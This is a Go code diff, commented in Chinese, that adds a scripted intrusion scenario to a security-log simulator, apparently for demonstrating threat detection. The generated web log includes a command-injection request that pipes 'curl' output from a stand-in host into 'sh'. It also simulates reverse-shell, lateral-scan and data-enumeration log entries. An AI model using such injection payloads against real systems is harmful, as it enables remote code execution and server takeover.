@@ -9,6 +9,7 @@ import (
 	"math/rand"
 	"os"
 	"path/filepath"
+	"slices"
 	"time"
 )
 
@@ -62,6 +63,9 @@ type Sim struct {
 	server    string
 	botnet    []string // 分布式撞库的僵尸网络来源
 	nextID    int      // 接口遍历的下一个用户 ID
+	intruder  attacker // 完整入侵剧本的攻击者（见 intrusion）
+	liveStory time.Time
+	liveDone  map[int]bool
 }
 
 type attacker struct {
@@ -130,7 +134,68 @@ func New(seed int64) *Sim {
 		s.botnet = append(s.botnet, s.randIP())
 	}
 	s.nextID = 100000
+	s.intruder = attacker{ip: s.randIP(), kind: "intrusion", ua: browserUA[0]}
 	return s
+}
+
+// payloadHost 是入侵剧本中攻击载荷写明的下载 / 回连地址，位于演示情报 configs/demo-intel.txt 的网段中。
+const payloadHost = "203.0.113.77"
+
+// 入侵剧本各步相对开始时间的分钟数。
+var storySteps = []int{0, 4, 6, 8, 9, 13, 18, 20, 23, 28, 30}
+
+// intrusion 生成完整入侵剧本中第 step 分钟的日志，用于演示资产攻击链路：
+//
+//	0 分：扫描官网（目录扫描）与服务器端口（侦察）
+//	4 分：尝试多种漏洞利用，均失败（利用）
+//	6 分：命令注入成功，载荷让服务器下载执行 203.0.113.77 上的脚本（突破）
+//	8 分起：服务器 10.0.0.10 连接载荷中的地址（命中威胁情报）并按固定间隔心跳，9 分反弹 Shell 连接攻击者（控制）
+//	20 分：服务器扫描内网的 445 端口与数据库主机的端口（横向）
+//	30 分：攻击者遍历用户资料接口（窃取）
+//
+// 回连地址在演示情报中：防火墙日志与 Web 日志分开读取、先后不定，外连情报地址的告警不依赖读取顺序。
+func (s *Sim) intrusion(w *writer, t time.Time, step int) {
+	a := s.intruder
+	web := func(method, uri string, status, size int) {
+		fmt.Fprintln(w.nginx, s.nginxLine(s.sec(t), a, method, uri, status, size))
+	}
+	switch step {
+	case 0:
+		for _, p := range scanPorts {
+			fmt.Fprintln(w.ufw, s.ufwLine(s.sec(t), a.ip, p, p != 80 && p != 443))
+		}
+		for i := 0; i < 40; i++ {
+			web("GET", scanPaths[i%len(scanPaths)], 404, 150)
+		}
+	case 4:
+		for _, uri := range rcePayloads[:6] {
+			web("GET", uri, 404, 162)
+		}
+		web("GET", "/api/ping?host=127.0.0.1;id", 400, 96)
+	case 6:
+		web("GET", "/api/ping?host=127.0.0.1;curl%20-s%20http://"+payloadHost+"/s.sh%7Csh", 200, 4821)
+	case 8, 13, 18, 23, 28:
+		fmt.Fprintln(w.forti, s.fortiOutLine(t.Add(time.Duration(10+step)*time.Second), s.server, payloadHost, 443, false))
+	case 9:
+		fmt.Fprintln(w.forti, s.fortiOutLine(t.Add(20*time.Second), s.server, a.ip, 4444, false))
+	case 20:
+		for i := 20; i < 45; i++ {
+			fmt.Fprintln(w.forti, s.fortiLanLine(s.sec(t), s.server, fmt.Sprintf("10.0.0.%d", i), 445))
+		}
+		for _, p := range scanPorts {
+			fmt.Fprintln(w.forti, s.fortiLanLine(s.sec(t), s.server, "10.0.0.21", p))
+		}
+	case 30:
+		for i := 0; i < 320; i++ {
+			web("GET", fmt.Sprintf("/api/v1/user/%d/profile", 200000+i), 200, 800+s.r.Intn(200))
+		}
+	}
+}
+
+// fortiLanLine 生成内网主机之间被拒绝的访问（横向扫描）。
+func (s *Sim) fortiLanLine(t time.Time, src, dst string, dport int) string {
+	return fmt.Sprintf(`date=%s time=%s devname="FGT-HQ" devid="FG100F0000000001" logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=%s srcport=%d srcintf="internal" dstip=%s dstport=%d dstintf="dmz" proto=6 action="deny" policyid=%d service="tcp/%d"`,
+		t.Format("2006-01-02"), t.Format("15:04:05"), src, 1024+s.r.Intn(60000), dst, dport, 30+s.r.Intn(5), dport)
 }
 
 func pick[T any](r *rand.Rand, list []T) T { return list[r.Intn(len(list))] }
@@ -346,7 +411,16 @@ func Generate(dir string, hours int, intensity int, seed int64) error {
 	defer w.close()
 	s := New(seed)
 	end := time.Now().Truncate(time.Minute)
-	for t := end.Add(-time.Duration(hours) * time.Hour); !t.After(end); t = t.Add(time.Minute) {
+	start := end.Add(-time.Duration(hours) * time.Hour)
+	// 完整入侵剧本放在结束前 2.5 小时（历史不足 3 小时时放在开头），剧本持续约半小时
+	story := end.Add(-150 * time.Minute)
+	if story.Before(start) {
+		story = start
+	}
+	for t := start; !t.After(end); t = t.Add(time.Minute) {
+		if m := int(t.Sub(story) / time.Minute); m >= 0 && slices.Contains(storySteps, m) {
+			s.intrusion(w, t, m)
+		}
 		// 夜间流量较低，工作时间较高，并在若干时间点制造攻击高峰
 		k := intensity
 		if h := t.Hour(); h < 7 {
@@ -383,6 +457,7 @@ func Live(ctx context.Context, dir string, interval time.Duration, intensity int
 
 // emitLive 生成时间戳为当前时间的少量日志。
 func (s *Sim) emitLive(w *writer, now time.Time, intensity int) {
+	s.liveIntrusion(w, now)
 	for i := 0; i < 2*intensity; i++ {
 		u := attacker{ip: pick(s.r, s.normal), ua: pick(s.r, browserUA)}
 		fmt.Fprintln(w.nginx, s.nginxLine(now, u, "GET", pick(s.r, normalPaths), 200, 500+s.r.Intn(20000)))
@@ -403,5 +478,22 @@ func (s *Sim) emitLive(w *writer, now time.Time, intensity int) {
 		}
 		// attack 会在 t 之后 0-59 秒内随机分布事件，回拨一分钟使时间不晚于当前
 		s.attack(w, now.Add(-59*time.Second), a)
+	}
+}
+
+// liveIntrusion 在实时模式下重放完整入侵剧本：启动 1 分钟后开始，此后每 6 小时一次。
+func (s *Sim) liveIntrusion(w *writer, now time.Time) {
+	if s.liveStory.IsZero() || len(s.liveDone) == len(storySteps) && now.Sub(s.liveStory) > 6*time.Hour {
+		s.liveStory, s.liveDone = now.Add(time.Minute), map[int]bool{}
+	}
+	if now.Before(s.liveStory) {
+		return
+	}
+	m := int(now.Sub(s.liveStory) / time.Minute)
+	for _, step := range storySteps {
+		if step <= m && !s.liveDone[step] {
+			s.liveDone[step] = true
+			s.intrusion(w, now.Add(-59*time.Second), step) // 事件分布在之后 0-59 秒内，回拨一分钟使时间不晚于当前
+		}
 	}
 }
